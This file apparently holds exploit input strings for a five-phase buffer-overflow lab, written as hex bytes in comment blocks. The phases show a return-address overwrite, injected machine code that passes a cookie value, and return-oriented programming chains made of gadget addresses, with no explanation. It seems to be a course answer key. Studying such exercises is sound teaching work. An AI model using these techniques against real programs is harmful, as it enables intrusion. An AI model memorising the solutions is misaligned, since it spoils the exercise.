/* phase1 */
/*
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
c0 17 40 00 00 00 00 00
*/
/* phase2 */
/*
bf fa 97 b9 59 68 ec 17
40 00 c3 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
78 dc 61 55 00 00 00 00
*/
/* phase3 */
/*
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
*/
/* phase4 */
/*
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c6 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
*/
/* phase5 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
42 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00